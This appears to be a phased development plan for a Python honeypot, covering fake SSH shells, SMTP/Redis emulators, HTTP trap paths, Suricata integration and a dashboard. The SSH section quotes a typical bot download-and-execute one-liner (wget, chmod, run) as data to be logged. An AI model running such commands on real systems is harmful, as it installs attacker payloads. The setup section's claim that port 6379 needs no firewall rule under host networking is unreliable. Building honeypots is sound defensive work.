# Honeypot Enhancement Plan

Inspired by [tpotce](https://github.com/telekom-security/tpotce). Keeps the existing
Python + SQLite + Flask architecture — no ELK stack. All new features follow the existing
pattern: a service module with a `start_*` function, logging through `log_event`, wired into
`main.py` as a daemon thread.

---

## Current State

| File | Purpose |
|------|---------|
| `main.py` | Starts all services as daemon threads |
| `logger.py` | `log_event()` → SQLite + file logging |
| `config.py` | Ports, feature flags, env-var defaults |
| `ratelimit.py` | Per-IP + global connection cap |
| `services/ssh_honey.py` | SSH emulator (paramiko) |
| `services/http_honey.py` | HTTP emulator |
| `services/ftp_honey.py` | FTP emulator |
| `services/telnet_honey.py` | Telnet emulator (IAC-aware) |
| `dashboard/app.py` | Flask app — `/api/events`, `/api/stats` |
| `alerts/discord.py` | Discord webhook, `send_alert()` |
| `tests/test_honeypot.py` | Existing test suite (has 4 stale auth tests to fix) |

**Current DB schema:**
```sql
CREATE TABLE events (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp  TEXT NOT NULL,
    ip         TEXT NOT NULL,
    port       INTEGER NOT NULL,
    service    TEXT NOT NULL,
    event_type TEXT NOT NULL,
    data       TEXT
);
```

---

## Phases

---

### Phase 0 — Fix Broken Tests

**Why first:** Four `TestDashboard` tests assert 401 responses for auth that was removed in a
prior session. They fail today and will hide real regressions. Fix before touching anything else.

**File:** `tests/test_honeypot.py`

Remove: `test_index_requires_auth`, `test_api_events_requires_auth`,
`test_api_stats_requires_auth`, `test_wrong_password_rejected`.

**Tests to add:**
- `test_index_returns_200`
- `test_api_events_returns_200`
- `test_api_stats_returns_200`

---

### Phase 1 — Foundation

Everything else depends on this. Do it in one sitting before starting any other phase.

#### 1.1 DB Migration

**File:** `logger.py` — `init_db()`

Add new columns using `ALTER TABLE ... ADD COLUMN IF NOT EXISTS` (SQLite 3.45.1 confirmed).
Place after the `CREATE TABLE IF NOT EXISTS` block.

```sql
-- New columns on events
ALTER TABLE events ADD COLUMN IF NOT EXISTS country     TEXT;
ALTER TABLE events ADD COLUMN IF NOT EXISTS city        TEXT;
ALTER TABLE events ADD COLUMN IF NOT EXISTS lat         REAL;
ALTER TABLE events ADD COLUMN IF NOT EXISTS lon         REAL;
ALTER TABLE events ADD COLUMN IF NOT EXISTS abuse_score INTEGER;

-- New table for Suricata alerts (Phase 7)
CREATE TABLE IF NOT EXISTS suricata_alerts (
    id        INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL,
    src_ip    TEXT NOT NULL,
    src_port  INTEGER,
    dst_port  INTEGER,
    proto     TEXT,
    alert_sig TEXT,
    category  TEXT,
    severity  INTEGER,
    raw       TEXT
);

-- Indexes so dashboard queries don't do full scans on large tables
CREATE INDEX IF NOT EXISTS idx_events_timestamp ON events(timestamp);
CREATE INDEX IF NOT EXISTS idx_events_country   ON events(country);
CREATE INDEX IF NOT EXISTS idx_events_service   ON events(service);
CREATE INDEX IF NOT EXISTS idx_events_ip        ON events(ip);
```

#### 1.2 JSON Line Logging

**File:** `logger.py`

Replace the plain-text log line with a JSON write. No custom handler class needed — just open
a file and write directly:

```python
_log_file = open(os.path.join(LOG_DIR, "honeypot.jsonl"), "a", buffering=1)

# In log_event, replace the _file_logger.info(...) call with:
_log_file.write(json.dumps(event_dict) + "\n")
```

`buffering=1` is line-buffered — each event is flushed immediately. No data loss on crash.

#### 1.3 Event Callback Registry

**File:** `logger.py`

The attack map and threat intel need to react to events without `logger.py` importing them
(circular import). Solve with a simple registry:

```python
_event_callbacks: list = []

def register_event_callback(fn):
    _event_callbacks.append(fn)
```

At the end of `log_event`, after the DB insert, call each callback with the event dict. Wrap
each call in `try/except` so a bad callback never crashes `log_event`.

Callbacks must be non-blocking — use `queue.put_nowait()`, never `queue.put()`. Under a bot
storm, a blocking put stalls the handler thread.

Consumer modules (`dashboard/app.py`, `threat_intel.py`) call `register_event_callback` at
module level. Since `main.py` imports all modules before starting threads, callbacks are
registered before any event fires.

#### 1.4 `log_event` Return Value

**File:** `logger.py`

Add `"rowid"` to the returned dict so threat intel (Phase 8) can update the row asynchronously:

```python
return {"rowid": cursor.lastrowid, "timestamp": timestamp, "ip": ip, ...}
```

No existing callers break — adding a key is non-destructive.

#### 1.5 Config Additions

**File:** `config.py`

```python
SMTP_PORT  = int(os.environ.get("SMTP_PORT",  "25"))
REDIS_PORT = int(os.environ.get("REDIS_PORT", "6379"))

# Fake shell accept rates
SSH_ACCEPT_RATE    = int(os.environ.get("SSH_ACCEPT_RATE",    "5"))  # accept 1-in-N logins
TELNET_ACCEPT_RATE = int(os.environ.get("TELNET_ACCEPT_RATE", "3"))

# Threat intel — lookup only (no reporting)
ABUSEIPDB_API_KEY = os.environ.get("ABUSEIPDB_API_KEY", "")

# Suricata log path — matches the shared volume mount in docker-compose.yml
SURICATA_EVE_LOG = os.environ.get("SURICATA_EVE_LOG", "/var/log/suricata/eve.json")

# Attack map — set to your actual server location
SERVER_LAT = float(os.environ.get("SERVER_LAT", "51.5074"))
SERVER_LON = float(os.environ.get("SERVER_LON", "-0.1278"))

# Discord: one alert per IP per alert_type per N seconds (prevents flooding)
DISCORD_ALERT_COOLDOWN = int(os.environ.get("DISCORD_ALERT_COOLDOWN", "60"))
```

#### 1.6 Fix `alerts/discord.py`

Two bugs to fix:

**Bug 1 — Unknown alert types bypass all guards and always fire.** The current code only checks
for `"connect"` and `"credential"`. Anything else — including the new `"exec_attempt"` type —
bypasses both guards with no toggle. Fix: add explicit handling for `"exec_attempt"` and drop
anything unrecognised.

**Bug 2 — No rate limiting.** A bot firing 50 exec requests floods Discord with 50 webhook
threads. Fix: add a module-level `dict[str, float]` keyed by `f"{ip}:{alert_type}"` and skip
the alert if it was sent less than `DISCORD_ALERT_COOLDOWN` seconds ago.

**Tests to add** (extend `TestDiscordAlerts` in `test_honeypot.py`):
- `test_unknown_alert_type_dropped` — `alert_type="foobar"` never calls `_post`
- `test_exec_alert_fires` — `alert_type="exec_attempt"` calls `_post`
- `test_cooldown_deduplicates` — same IP+type twice within 60s calls `_post` only once

**Tests to add** (`tests/test_logger.py` — new file):
- `test_schema_has_geo_columns` — assert `country`, `city`, `lat`, `lon` in schema after `init_db`
- `test_suricata_table_created` — assert `suricata_alerts` table exists
- `test_indexes_created` — assert all four indexes in `sqlite_master`
- `test_log_event_returns_rowid` — returned dict has integer `rowid`
- `test_callback_called` — registered callback receives the event dict
- `test_bad_callback_doesnt_crash_log_event` — raising callback doesn't prevent return
- `test_migration_idempotent` — call `init_db()` twice on an existing DB, no error

---

### Phase 2 — GeoIP Enrichment

**New file:** `geoip.py`

Use **`geoip2fast`** — bundles its own database, zero setup, no registration, no monthly URL.
`pip install geoip2fast`.

At implementation time: inspect the result object attributes by running
`python3 -c "from geoip2fast import GeoIP2Fast; print(GeoIP2Fast().lookup('8.8.8.8'))"`.
Country code is reliable. If lat/lon are absent from the bundled DB, use a small
country-centroid dict (~50 most-attacked countries is enough for the attack map).

Wire into `log_event`: call `geoip.lookup(ip)` and include the result fields in both the
INSERT and the returned dict. Private IPs short-circuit immediately using `ipaddress.ip_address(ip).is_private`. Any exception returns `{}` — GeoIP failure must never break logging.

**New dep:** `geoip2fast` in `requirements.txt`

**Tests to add** (`tests/test_geoip.py`):
- `test_private_ips_return_empty` — `192.168.1.1`, `127.0.0.1`, `10.0.0.1` all return `{}`
- `test_public_ip_has_country` — known public IP returns dict with non-empty `"country"`
- `test_bad_input_returns_empty` — `""`, `"not-an-ip"` return `{}` without raising
- `test_geo_written_to_db` — log an event from a public IP, query DB, assert `country` not NULL

---

### Phase 3 — Live Attack Map

#### 3.1 SSE Backend

**File:** `dashboard/app.py`

**Critical:** add `threaded=True` to `app.run()`. Without it, the first SSE client's
long-lived connection blocks every other HTTP request on the dashboard.

Add a module-level list of per-client queues protected by a `threading.Lock`. Register a
`publish_attack` callback at module level (runs at import time, before service threads start).
The callback builds a small payload dict `{src_lat, src_lon, dst_lat, dst_lon, service,
country, ip}` and does `queue.put_nowait()` on each client's queue — never blocking.

The SSE generator yields events from its queue with a 30s keepalive comment on timeout.
Add the client queue on entry, remove it in `finally` with the lock held.

New route: `GET /api/attack-stream` — `Content-Type: text/event-stream`.

#### 3.2 Attack Map Frontend

**Files:** `dashboard/templates/index.html`, `dashboard/static/` (vendored assets)

Vendor D3.js v7, Chart.js, and the world 110m TopoJSON as static files. CDN JS fails silently
when the browser has no internet (common for local VM dashboards).

Map: D3.js Natural Earth projection, SVG arcs from attacker to server, 3-second fade-out.
Skip events with null coordinates. Throttle DOM updates to ~10 arcs/second to avoid jank on
a busy server. Set `SERVER_LAT`/`SERVER_LON` in `.env` — the London default is just a placeholder.

**Tests to add** (`tests/test_attack_map.py`):
- `test_sse_content_type` — GET `/api/attack-stream`, assert `text/event-stream`
- `test_event_with_geo_published` — call `publish_attack` with valid lat/lon, assert queued
- `test_event_without_geo_not_published` — `lat=None`, assert nothing queued
- `test_full_queue_doesnt_raise` — fill client queue to max, call again, no exception

---

### Phase 4 — SSH Improvements

Implement in order: exec channel first (simpler, highest value), interactive shell second.

#### 4.1 SSH Exec Channel

**File:** `services/ssh_honey.py` — `_SSHServer`

Most SSH bots never open an interactive shell. They authenticate, then immediately fire a
single `exec` request containing a shell one-liner: `cd /tmp && wget http://... && chmod +x m && ./m`.
The current code silently discards these — it's the most valuable data we're missing.

Add `check_channel_exec_request(self, channel, command)`:
- Decode the command string
- Extract URLs with a simple regex (`https?://\S+`)
- Log as `"download_attempt"` if URLs or wget/curl found, otherwise `"exec_attempt"`
- Send a Discord alert (uses the new `"exec_attempt"` alert type from Phase 1)
- Return `True`, send exit status 0, close channel

#### 4.2 Fake Shell

**New file:** `services/fake_shell.py`

Shared by SSH and Telnet. Single entry point: `run_shell(send_fn, recv_line_fn, ip, port, service, username)`.

Cap concurrent sessions at 20 with a `threading.Semaphore`. If full, send
`bash: fork: Resource temporarily unavailable\r\n` and return.

Fake filesystem (`_FS` dict): `/etc/passwd`, `/etc/hostname`, `/etc/os-release`,
`/proc/version`, `/var/log/auth.log` (a few fake entries for realism).

Commands:

| Input | Response |
|---|---|
| `id`, `whoami` | `uid=0(root) gid=0(root) groups=0(root)` |
| `uname -a` | Fake kernel string |
| `ls`, `ls -la` | Fake `/root` listing |
| `pwd` | Current directory (tracks `cd`) |
| `cd <path>` | Update cwd silently |
| `cat <path>` | Content from `_FS`, or `No such file or directory` |
| `wget <url>`, `curl <url>` | Log `download_attempt`, sleep 1s, `Connection refused` |
| `exit`, `logout` | End session |
| anything else | `bash: <cmd>: command not found` |

Command logging: `log_event(..., "command", {"cmd": line})` for all commands.
`wget`/`curl` additionally logged as `"download_attempt"` and trigger a Discord alert.
No Discord alerts for ordinary commands.

PTY input: `recv_line_fn` must buffer bytes until `\r`/`\n`, strip backspace (`\x7f`/`\x08`)
from the buffer, and discard ANSI escape sequences (`\x1b[...`). Without this, logged commands
contain garbage from arrow keys and corrections.

Inactivity timeout: 120s (set on the underlying socket before passing to `run_shell`).

#### 4.3 SSH Integration

**File:** `services/ssh_honey.py`

Add to `_SSHServer`:
- `check_channel_pty_request` → return `True`
- `check_channel_shell_request` → return `True`

Without both, paramiko silently rejects the shell and `fake_shell` never runs.

Accept 1-in-`SSH_ACCEPT_RATE` (default: 5) logins to lure bots into an interactive session.
Track attempt count on the `_SSHServer` instance.

#### 4.4 Telnet Integration

**File:** `services/telnet_honey.py`

Same pattern: accept 1-in-`TELNET_ACCEPT_RATE` (default: 3) logins and call `run_shell`.
The existing `_recv_line` already handles IAC stripping and works as `recv_line_fn` directly.

**Tests to add** (`tests/test_fake_shell.py`):
- `test_id_returns_root`
- `test_cat_known_file` — `/etc/passwd` contains `root:`
- `test_cat_unknown_file_returns_error`
- `test_cd_updates_pwd`
- `test_wget_logs_download_attempt` — assert `download_attempt` event logged with URL
- `test_wget_sends_discord_alert`
- `test_ordinary_command_no_discord_alert` — `ls` does not call `send_alert`
- `test_exit_ends_session`
- `test_backspace_stripped` — `ls\x7f\x7fps\n` is logged as `ps`
- `test_session_cap_blocks_when_full`

**Tests to add** (`tests/test_ssh_honey.py`):
- `test_exec_request_logged` — `check_channel_exec_request` logs `exec_attempt`
- `test_exec_wget_logged_as_download` — wget URL in exec → `download_attempt`
- `test_pty_request_returns_true`
- `test_shell_request_returns_true`

---

### Phase 5 — New Services

#### 5.1 SMTP Honeypot

**New file:** `services/smtp_honey.py`

Port 25. Only useful on a public internet-facing server — note in `.env.example`.

State machine: GREETING → EHLO/HELO → MAIL FROM → RCPT TO (repeatable) → DATA → body until
`\r\n.\r\n` → log → QUIT. Respond `250 OK` to everything to act as an open relay.

**AUTH credential decoding:** Bots send `AUTH PLAIN <base64>` where the payload decodes to
`\x00username\x00password`. Without decoding, stored credentials are unreadable. Decode with
`base64.b64decode`, split on `\x00`. `AUTH LOGIN` sends username and password as two separate
base64 lines. Log both formats as `event_type="credential"`.

Log completed email sessions as `event_type="email_attempt"` with `{helo, mail_from, rcpt_to,
subject, body_preview}`.

Discord alerts: yes for `credential` only. `email_attempt` is too noisy on a public server
(spammers probe port 25 constantly — the cooldown helps but hundreds of unique IPs per hour
would still flood Discord).

Add to `SERVICES` in `main.py`.

#### 5.2 Redis Honeypot

**New file:** `services/redis_honey.py`

Port 6379. Redis uses RESP. Modern clients send RESP arrays (`*1\r\n$4\r\nPING\r\n`); older
tools send inline (`PING\r\n`). The parser must handle both — read the first line, if it starts
with `*` parse N bulk strings, otherwise split the inline string.

| Command | Response |
|---|---|
| `PING` | `+PONG\r\n` |
| `AUTH <pw>` | log `credential`, `+OK\r\n` |
| `INFO` | bulk string with fake Redis INFO output |
| `CONFIG GET *`, `KEYS *` | `*0\r\n` (empty array) |
| `DBSIZE` | `:0\r\n` |
| everything else | `+OK\r\n` |

Never return `-ERR unknown command` — it signals we're a honeypot.

Discord alerts: `credential` events only.

Add to `SERVICES` in `main.py`.

**Tests to add** (`tests/test_smtp.py`):
- `test_banner_is_220`
- `test_full_session_logged` — EHLO → MAIL FROM → RCPT TO → DATA session, assert `email_attempt` event
- `test_auth_plain_decoded` — assert `username` and `password` readable, not base64
- `test_multiple_rcpt_captured`

**Tests to add** (`tests/test_redis.py`):
- `test_inline_ping` — `PING\r\n` → `+PONG\r\n`
- `test_resp_array_ping` — `*1\r\n$4\r\nPING\r\n` → `+PONG\r\n`
- `test_auth_logs_credential` — assert credential event with password
- `test_unknown_command_returns_ok` — `FLUSHALL` → `+OK\r\n`, not `-ERR`

---

### Phase 6 — HTTP Trap Expansion

**File:** `services/http_honey.py`

Add a route dispatch table before the existing fallback response. Normalise the path first:
strip query string, strip trailing slash, lowercase.

| Path (normalised) | Response | Event type |
|---|---|---|
| `/wp-login.php` | GET: fake login form. POST: extract `log`+`pwd` from body | `trap_hit` / `credential` |
| `/wp-admin` | Redirect → `/wp-login.php` | `trap_hit` |
| `/phpmyadmin` | Fake phpMyAdmin login page | `trap_hit` |
| `/.env` | Fake env file with plausible-looking fake credentials | `trap_hit` |
| `/.git/config` | Fake git config | `trap_hit` |
| `/.aws/credentials` | Fake AWS credentials (honeytokens) | `trap_hit` |
| `/admin` | 401 with `WWW-Authenticate: Basic realm="Admin"` | `trap_hit` |
| `/actuator/env` | Fake Spring Boot actuator JSON | `trap_hit` |
| `/manager/html` | Fake Tomcat manager | `trap_hit` |

All trap hits log full headers (cap at 20) and body (cap at 1024 bytes).

Discord alerts: yes for `credential`, no for `trap_hit` — scanners hit every path constantly.

All other paths (including log4j/jndi scanner paths) fall through to the existing default
response and are logged with the full request — no special casing needed.

**Tests to add** (`tests/test_http_traps.py`):
- `test_wp_login_post_extracts_credentials` — POST `log=admin&pwd=pass`, assert credential event
- `test_dotenv_returns_content` — GET `/.env`, assert 200 with non-empty body
- `test_path_normalised` — GET `/wp-admin/` (trailing slash) hits wp-admin handler
- `test_unknown_path_returns_default` — `/some/path` returns normal Apache page

---

### Phase 7 — Suricata Integration

Suricata runs as a Docker sidecar and detects attacks on ports we don't monitor.

#### 7.1 Docker Changes

**File:** `docker-compose.yml`

Switch **both** services to `network_mode: host`. This removes Docker's NAT, which is required
for Suricata to see real attacker IPs (not the Docker gateway) and for the honeypot to bind
privileged ports directly.

Consequences:
- Remove all `ports:` mappings (host networking exposes them directly)
- Remove `networks:` section
- Add `cap_add: [NET_BIND_SERVICE]` to the honeypot service to bind ports <1024
- Do not add `depends_on: suricata` — the honeypot starts independently

`network_mode: host` only works on Linux. The deployment target (Hetzner/DigitalOcean) is fine.

Both services share a `suricata-logs` volume: Suricata writes to it, the honeypot tailer reads
from it read-only.

#### 7.2 Suricata Config

**New files:** `suricata/suricata.yaml`, `suricata/entrypoint.sh`

`suricata.yaml`: minimal — enable only `eve-log` output with `alert` event type to
`/var/log/suricata/eve.json`. Disable all other outputs.

`entrypoint.sh`: just run `suricata` directly. Update rules manually with
`docker compose exec suricata suricata-update` when needed — not on every start (it's slow and
runs on boot when rules are already fresh).

`SURICATA_IFACE` env var (default `eth0`) controls which interface to monitor. On many VMs the
interface is `ens3` or `ens160` — check with `ip link show`.

#### 7.3 Eve Tailer

**New file:** `services/suricata_tailer.py`

Tail `SURICATA_EVE_LOG`. If the file doesn't exist, poll every 10s until it does. Seek to end
on open (don't replay history). On each line, parse JSON, skip non-`alert` events, insert into
`suricata_alerts` table.

Add to `SERVICES` in `main.py`.

**Tests to add** (`tests/test_suricata_tailer.py`):
- `test_alert_inserted` — write fake eve.json alert to temp file, run tailer briefly, assert row in DB
- `test_non_alert_ignored` — write a `dns` event, assert no row inserted
- `test_bad_json_no_crash` — write a truncated line, assert tailer continues

---

### Phase 8 — Threat Intel Enrichment

**New file:** `threat_intel.py`

AbuseIPDB lookup via their free v2 API (1k/day). Enrich only `credential` and
`download_attempt` events — this covers the highest-value events while staying well within the
free tier quota.

Pattern: non-blocking. Register a callback that submits work to a
`ThreadPoolExecutor(max_workers=4)`. The worker makes the HTTP call and updates the `abuse_score`
column on the specific row using `rowid` from the event dict.

Cache per-IP results with a 24h TTL (`dict[ip → (score, time)]`). Handle HTTP 429 by logging a
warning and pausing lookups for 1 hour.

If `ABUSEIPDB_API_KEY` is empty, the module loads but does nothing.

**Tests to add** (`tests/test_threat_intel.py`):
- `test_private_ip_skipped` — `192.168.1.1` never calls the API
- `test_non_enriched_event_type_skipped` — `event_type="connect"` skipped
- `test_result_updates_db_row` — mock HTTP response, assert `abuse_score` written to correct row
- `test_ip_cached` — same IP twice within 24h, HTTP called only once

---

### Phase 9 — Dashboard Improvements

**Files:** `dashboard/app.py`, `dashboard/templates/index.html`

#### New API Endpoints

**`GET /api/timeline`** — attacks per hour for the last 24h. Groups by
`strftime('%Y-%m-%dT%H:00:00', timestamp)`. Uses `idx_events_timestamp`.

**`GET /api/geo-stats`** — top 20 countries by event count.

**`GET /api/events`** — extend with query params: `?service=`, `?event_type=`, `?search=` (IP
prefix match only — no `LIKE '%x%'` full-table scan), `?limit=`, `?offset=`.

**`GET /api/events/export.csv`** — stream CSV rows from a cursor, one at a time. Never load all
rows into memory. Use `flask.Response` with a generator function.

**`GET /api/suricata/alerts`** — last 200 rows from `suricata_alerts`.

#### New UI Panels

Using vendored Chart.js:
1. **Timeline** (line chart, full width) — auto-refreshes every 60s
2. **Top Countries** (horizontal bar chart) — auto-refreshes every 60s
3. **Suricata Alerts** table — auto-refreshes every 30s
4. **Filter bar** above events table — service dropdown, event type dropdown, IP search,
   Apply, Export CSV

Add stat cards for SMTP and Redis.

**Tests to add** (`tests/test_dashboard.py` — new file, extends pattern from `TestDashboard`):
- `test_timeline_returns_list`
- `test_geo_stats_returns_list`
- `test_filter_by_service` — seed SSH + HTTP events, `?service=SSH` returns only SSH
- `test_filter_by_ip` — `?search=1.2.3` returns only matching IPs
- `test_export_csv_headers` — assert `Content-Type: text/csv` and correct column header row
- `test_suricata_alerts_returns_list`

---

### Phase 10 — Docker and Deployment

#### `docker-compose.yml`

Full structure (see Phase 7 for the host-networking rationale):

```yaml
services:
  honeypot:
    build: .
    network_mode: host
    cap_add: [NET_BIND_SERVICE]
    environment:
      - DISCORD_WEBHOOK_URL=${DISCORD_WEBHOOK_URL:-}
      - ABUSEIPDB_API_KEY=${ABUSEIPDB_API_KEY:-}
      - SERVER_LAT=${SERVER_LAT:-51.5074}
      - SERVER_LON=${SERVER_LON:--0.1278}
      - SURICATA_EVE_LOG=/var/log/suricata/eve.json
    volumes:
      - honeypot-data:/app/data
      - honeypot-logs:/app/logs
      - suricata-logs:/var/log/suricata:ro
    restart: unless-stopped

  suricata:
    image: jasonish/suricata:latest
    network_mode: host
    cap_add: [NET_ADMIN, NET_RAW, SYS_NICE]
    environment:
      - SURICATA_IFACE=${SURICATA_IFACE:-eth0}
    volumes:
      - suricata-logs:/var/log/suricata
      - ./suricata/suricata.yaml:/etc/suricata/suricata.yaml:ro
      - ./suricata/entrypoint.sh:/entrypoint.sh:ro
    command: ["/bin/sh", "/entrypoint.sh"]
    restart: unless-stopped

volumes:
  honeypot-data:
  honeypot-logs:
  suricata-logs:
```

#### `Dockerfile`

```dockerfile
FROM python:3.12-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
RUN mkdir -p logs data
EXPOSE 22 21 23 25 80 6379 8080
CMD ["python", "main.py"]
```

#### `requirements.txt`

```
paramiko~=3.5
flask~=3.1
requests~=2.32
geoip2fast
```

#### `setup.sh` additions

After the SSH port change block, add UFW rules for the new ports. Port 6379 does not need an
explicit UFW rule — on a public server with UFW enabled, all incoming traffic reaches the
honeypot container directly via host networking regardless.

```bash
for port in 22 21 23 25 80 8080; do
    ufw allow ${port}/tcp 2>/dev/null || true
done
```

#### `.env.example`

```bash
DISCORD_WEBHOOK_URL=

# Free at https://www.abuseipdb.com/register
ABUSEIPDB_API_KEY=

# Your server's actual coordinates (find at latlong.net)
SERVER_LAT=51.5074
SERVER_LON=-0.1278

# Network interface Suricata should monitor (check: ip link show)
SURICATA_IFACE=eth0
```

---

## Implementation Order

```
Phase 0   Fix broken tests                          prerequisite
Phase 1   Foundation (DB, logging, callbacks)       everything else depends on this
Phase 2   GeoIP                                     unlocks attack map coordinates
Phase 3   Attack map                                depends on Phase 2
Phase 5   SMTP + Redis                              independent — adds data volume fast
Phase 6   HTTP traps                                independent
Phase 4   SSH exec + fake shell                     most complex, exec channel first
Phase 7   Suricata                                  requires Docker changes
Phase 8   Threat intel                              depends on Phase 1 rowid return
Phase 9   Dashboard improvements                    benefits from all earlier data
Phase 10  Docker + deployment                       finalize after everything works
```

---

## New Files

| File | Phase | Purpose |
|------|-------|---------|
| `geoip.py` | 2 | `geoip2fast` wrapper |
| `threat_intel.py` | 8 | AbuseIPDB async enrichment |
| `services/fake_shell.py` | 4 | Shared fake shell (SSH + Telnet) |
| `services/smtp_honey.py` | 5 | SMTP emulator |
| `services/redis_honey.py` | 5 | Redis RESP emulator |
| `services/suricata_tailer.py` | 7 | Tail Suricata eve.json |
| `suricata/suricata.yaml` | 7 | Minimal Suricata config |
| `suricata/entrypoint.sh` | 7 | Start Suricata |
| `dashboard/static/d3.v7.min.js` | 3 | Vendored D3.js |
| `dashboard/static/chart.min.js` | 9 | Vendored Chart.js |
| `dashboard/static/world-110m.json` | 3 | Vendored world TopoJSON |
| `.env.example` | 10 | Documents all env vars |
| `tests/test_logger.py` | 1 | Logger/DB tests |
| `tests/test_geoip.py` | 2 | GeoIP tests |
| `tests/test_attack_map.py` | 3 | SSE tests |
| `tests/test_fake_shell.py` | 4 | Fake shell tests |
| `tests/test_ssh_honey.py` | 4 | SSH exec/shell tests |
| `tests/test_smtp.py` | 5 | SMTP tests |
| `tests/test_redis.py` | 5 | Redis RESP tests |
| `tests/test_http_traps.py` | 6 | HTTP trap tests |
| `tests/test_suricata_tailer.py` | 7 | Eve tailer tests |
| `tests/test_threat_intel.py` | 8 | AbuseIPDB tests |
| `tests/test_dashboard.py` | 9 | New dashboard endpoint tests |
